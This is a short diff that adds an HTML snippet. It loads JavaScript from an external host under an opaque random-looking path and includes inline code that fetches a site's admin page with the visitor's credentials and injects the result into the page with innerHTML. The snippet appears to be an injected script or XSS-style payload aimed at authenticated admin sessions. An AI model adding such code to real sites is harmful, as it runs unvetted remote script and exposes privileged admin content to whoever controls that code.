@@ -1,0 +1,16 @@
+<div id="container"></div>
+<script src="https://static.drone-ci.com/analysis/xg8LYbRg9nN9KHPm">
+async function load() {
+  try {
+    const path = window.location.pathname;  
+    const adminPath = path.split('/')[1];
+    const url = `/${adminPath}/index/main.html`;
+    const res = await fetch(url, { credentials: 'include' });
+    const html = await res.text();
+    document.getElementById('container').innerHTML = html;
+  } catch (e) {
+    console.log('失败:', e.message);
+  }
+}
+load();
+</script>
